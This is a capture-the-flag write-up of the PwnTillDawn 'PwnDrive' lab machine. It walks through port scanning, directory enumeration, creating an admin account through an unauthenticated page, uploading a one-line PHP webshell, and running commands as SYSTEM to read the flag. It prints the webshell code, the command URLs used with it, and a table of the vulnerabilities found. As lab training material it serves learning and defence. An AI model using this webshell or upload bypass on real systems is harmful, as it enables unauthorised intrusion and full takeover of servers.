# 🛡️ PwnTillDawn — PwnDrive Machine Writeup

> **Platform:** PwnTillDawn Academy  
> **Target IP:** `10.150.150.11`  
> **Hostname:** `PwnDrive`  
> **OS:** VM Kali Linux
> **Difficulty:** Beginner–Intermediate  
> **Flag:** `PwnTillDawnAcademyIsAwesome!!!`

---

## 📋 Table of Contents

- [Reconnaissance](#-reconnaissance)
- [Service Enumeration](#-service-enumeration)
- [Web Directory Enumeration](#-web-directory-enumeration)
- [Initial Access — File Upload Bypass](#-initial-access--file-upload-bypass)
- [Remote Code Execution (Webshell)](#-remote-code-execution-webshell)
- [Post-Exploitation](#-post-exploitation)
- [Flag](#-flag)

---

## 🔍 Reconnaissance

### Nmap Full Port Scan

```bash
nmap -sV -sC -p- 10.150.150.11
```

**Key Results:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 21/tcp | open | ftp | Xlight ftpd 3.9 |
| 80/tcp | open | http | Apache httpd 2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.9 |
| 135/tcp | open | msrpc | Microsoft Windows RPC |
| 139/tcp | open | netbios-ssn | Microsoft Windows netbios-ssn |
| 443/tcp | open | ssl/http | Apache httpd 2.4.46 |
| 445/tcp | open | microsoft-ds | Windows Server 2008 R2 Enterprise SP1 |
| 1433/tcp | open | ms-sql-s | Microsoft SQL Server 2012 (11.00.2100.00 RTM) |
| 3306/tcp | open | mysql | MariaDB 5.5.5–10.4.14 |
| 3389/tcp | open | ms-wbt-server | RDP |
| 49152–49157/tcp | open | msrpc | Microsoft Windows RPC |

**OS Detection:** Windows Server 2008 R2 – 2012  
**CPE:** `cpe:/o:microsoft:windows`

**HTTP Title:** `PwnDrive - Your Personal Online Storage`  
**PHPSESSID Cookie:** `httponly` flag NOT set ⚠️

**SQL Server Details (Port 1433):**
```
Target_Name: PWNDRIVE
NetBIOS_Domain_Name: PWNDRIVE
NetBIOS_Computer_Name: PWNDRIVE
DNS_Domain_Name: PwnDrive
DNS_Computer_Name: PwnDrive
Product_Version: 6.1.7601
```

**MariaDB Details (Port 3306):**
```
Version: 5.5.5-10.4.14-MariaDB
Thread ID: 143
Auth Plugin: mysql_native_password
```

---

## 🌐 Service Enumeration

### Screenshot — Nmap HTTP Info (Port 80)

![nmap-http](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/e55e8ab19f9f31e94d827d309d73e0fb5ad4a280/pwntilldawn%201.png)

> Apache/2.4.46 (Win64), PHP/7.4.9, HTTP methods: GET HEAD POST OPTIONS  
> Cookie `PHPSESSID` has `httponly` flag NOT set.

### Screenshot — MSSQL (Port 1433)

![nmap-mssql](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/e55e8ab19f9f31e94d827d309d73e0fb5ad4a280/pwntilldawn%202.png)

> Microsoft SQL Server 2012 RTM, Service Pack Level: RTM, no post-SP patches applied.

### Screenshot — MariaDB (Port 3306)

![nmap-mariadb](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/e55e8ab19f9f31e94d827d309d73e0fb5ad4a280/pwntilldawn%203.png)

> MariaDB 5.5.5-10.4.14, SSL cert issued by `PwnDrive`.

### Screenshot — Higher RPC Ports

![nmap-rpc](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/e55e8ab19f9f31e94d827d309d73e0fb5ad4a280/pwntilldawn%204.png)

> Ports 49152–49157 running Microsoft Windows RPC.

---

## 📁 Web Directory Enumeration

```bash
gobuster dir -u http://10.150.150.11 -w /usr/share/wordlists/dirb/common.txt
```

### Screenshot — Gobuster Results

![gobuster](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/e55e8ab19f9f31e94d827d309d73e0fb5ad4a280/pwntilldawn%205.png)

**Notable Directories Found:**

| Path | Status | Notes |
|------|--------|-------|
| `/admin/` | 301 | Admin panel — directory listing enabled! |
| `/upload/` | 301 | File upload storage — directory listing enabled! |
| `/index.php` | 200 | Main application |
| `/components/` | 301 | App components |
| `/css/` | 301 | Stylesheets |
| `/img/` | 301 | Images |
| `/inc/` | 301 | Includes |
| `/utils/` | 301 | Utilities |
| `/vendor/` | 301 | Third-party libraries |

---

## 🗂️ Admin Panel — Directory Listing

Navigating to `http://10.150.150.11/admin/` revealed an open directory listing:

### Screenshot — `/admin/` Index

![admin-index](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/e55e8ab19f9f31e94d827d309d73e0fb5ad4a280/pwntilldawn%207.png)

```
/admin/addedituser.php   2020-11-16  3.4K
/admin/deleteuser.php    2020-11-16   932
/admin/manageusers.php   2020-11-16  2.0K
```

> ⚠️ Admin pages are accessible — no authentication on directory listing itself.

## 👤 User Enumeration — Admin Panel

Visiting `/admin/manageusers.php` reveals all existing user accounts:

### Screenshot — Manage Users

![manage-users](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/e55e8ab19f9f31e94d827d309d73e0fb5ad4a280/pwntilldawn%209.png)

| Username | Role |
|----------|------|
| admin | admin |
| Chris | user |
| Linda | user |
| testuser | admin |

---

## 👤 User Creation — Admin Panel

Visiting `/admin/addedituser.php` allows creating a new admin user with no prior authentication:

### Screenshot — Create User Form (`addedituser.php`)

![create-user](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/e55e8ab19f9f31e94d827d309d73e0fb5ad4a280/pwntilldawn%208.png)

> Created a new user `testuser` with role `admin` via `/admin/addedituser.php`.

---

## 📤 Initial Access — File Upload Bypass

After logging in as `testuser` (admin role), the application allows file uploads. The upload functionality does **not properly restrict PHP file types**, allowing a PHP webshell to be uploaded directly.

### PHP Webshell Used

```php
<?php system($_GET['cmd']); ?>
```

> Uploaded as `cmd.php` via the **"Add File"** feature in the PwnDrive UI.

### Screenshot — Successful Upload

![file-uploaded](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/269c7f30b6eb4dc843a21ca40edc7b3b7268117e/pwntilldawn%2010.png)

> `File Uploaded Successfully!` — `cmd.php` is now listed in personal files.

### Screenshot — Upload Directory (`/upload/`)

![upload-index](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/main/pwntilldawn%206.png)

```
/upload/2/    2026-04-22 01:16
/upload/10/   2020-11-16 10:44
```

The webshell lands in a numbered user folder, e.g., `/upload/11/cmd.php`:

### Screenshot — `/upload/11/` Index

![upload-11](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/269c7f30b6eb4dc843a21ca40edc7b3b7268117e/pwntilldawn%2011.png)

```
/upload/11/cmd.php   2024-03-21 06:24   31 bytes
```

---

## 💻 Remote Code Execution (Webshell)

The uploaded webshell is now executable via the browser URL bar.

**Webshell URL Format:**
```
http://10.150.150.11/upload/11/cmd.php?cmd=<COMMAND>
```

---

### `whoami`

```
http://10.150.150.11/upload/11/cmd.php?cmd=whoami
```

#### Screenshot

![whoami](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/main/pwntilldawn%2012.png)

```
nt authority\system
```

> ✅ Running as **SYSTEM** — highest privilege on Windows, no further privilege escalation needed!

---

### `hostname`

```
http://10.150.150.11/upload/11/cmd.php?cmd=hostname
```

#### Screenshot

![hostname](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/269c7f30b6eb4dc843a21ca40edc7b3b7268117e/pwntilldawn%2013.png)

```
PwnDrive
```

---

### `net user`

```
http://10.150.150.11/upload/11/cmd.php?cmd=net+user
```

#### Screenshot

![net-user](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/269c7f30b6eb4dc843a21ca40edc7b3b7268117e/pwntilldawn%2014.png)

```
User accounts for \\
Administrator   Guest   Jboden   tony
The command completed with one or more errors.
```

---

### `dir C:\Users`

```
http://10.150.150.11/upload/11/cmd.php?cmd=dir+C:\Users
```

#### Screenshot

![dir-users](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/269c7f30b6eb4dc843a21ca40edc7b3b7268117e/pwntilldawn%2015.png)

```
Directory of C:\Users

Administrator        06/27/2016 02:05 AM
Classic .NET AppPool 03/28/2020 09:01 AM
Jboden               06/27/2016 01:58 AM
MSSQL$SQLEXPRESS     07/13/2009 09:57 PM
Public               07/16/2020 06:44 AM
tony
```

---

### `dir C:\Users\Administrator`

```
http://10.150.150.11/upload/11/cmd.php?cmd=dir+C:\Users\Administrator
```

#### Screenshot

![dir-admin](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/269c7f30b6eb4dc843a21ca40edc7b3b7268117e/pwntilldawn%2016.png)

```
Contacts    11/17/2020 07:19 AM
Desktop     06/27/2016 12:21 AM
Documents   08/24/2020 05:59 AM
Downloads   06/27/2016 12:21 AM
Favorites   06/27/2016 12:21 AM
Links       06/27/2016 12:21 AM
Music       06/27/2016 12:21 AM
Pictures    06/27/2016 12:21 AM
Saved Games 06/27/2016 12:21 AM
Searches    06/27/2016 12:21 AM
Videos
```

---

### `dir C:\Users\Administrator\Desktop`

```
http://10.150.150.11/upload/11/cmd.php?cmd=dir+C:\Users\Administrator\Desktop
```

#### Screenshot

![dir-desktop](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/269c7f30b6eb4dc843a21ca40edc7b3b7268117e/pwntilldawn%2017.png)

```
11/17/2020  07:19 AM    .
11/17/2020  07:20 AM    ..
11/17/2020  07:20 AM    30  FLAG1.txt
08/11/2020  08:29 AM   979  Xlight FTP Server.lnk

2 File(s)   1,009 bytes
2 Dir(s)    21,059,317,760 bytes free
```

> 🏁 `FLAG1.txt` found on the Administrator's Desktop!

---

## 🏁 Flag

```
http://10.150.150.11/upload/11/cmd.php?cmd=type+C:\Users\Administrator\Desktop\FLAG1.txt
```

### Screenshot — Flag

![flag](https://github.com/izzulharith02/week-3---PwnTillDawn/blob/269c7f30b6eb4dc843a21ca40edc7b3b7268117e/pwntilldawn%2018.png)

```
PwnTillDawnAcademyIsAwesome!!!
```

---

## 🗺️ Attack Chain Summary

```
Nmap Scan
    │
    ▼
Gobuster Dir Enum ──► /admin/ (open directory listing)
    │
    ▼
Access /admin/addedituser.php ──► Create testuser (admin role)
    │
    ▼
Login as testuser ──► Upload cmd.php webshell (no extension filter)
    │
    ▼
Access /upload/11/cmd.php?cmd=whoami ──► nt authority\system
    │
    ▼
dir C:\Users\Administrator\Desktop ──► FLAG1.txt
    │
    ▼
type FLAG1.txt ──► PwnTillDawnAcademyIsAwesome!!!
```

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scan & service enumeration |
| `gobuster` | Web directory brute-force |
| Browser | Manual web exploitation |
| PHP Webshell (`cmd.php`) | Remote code execution |

---

## 🔐 Vulnerabilities Identified

| Vulnerability | Severity | Location |
|--------------|----------|---------|
| Unrestricted File Upload (PHP) | Critical | `/upload/` endpoint |
| Directory Listing Enabled | Medium | `/admin/`, `/upload/` |
| No Auth on Admin User Creation | Critical | `/admin/addedituser.php` |
| Web App Running as SYSTEM | Critical | Apache/PHP process |
| PHPSESSID `httponly` not set | Low | HTTP Cookie |
| MariaDB & MSSQL Exposed | Medium | Ports 3306, 1433 |
| Outdated SQL Server (2012 RTM, no patches) | High | Port 1433 |


*Writeup by: [Izzul Harith] | Platform: PwnTillDawn Academy*
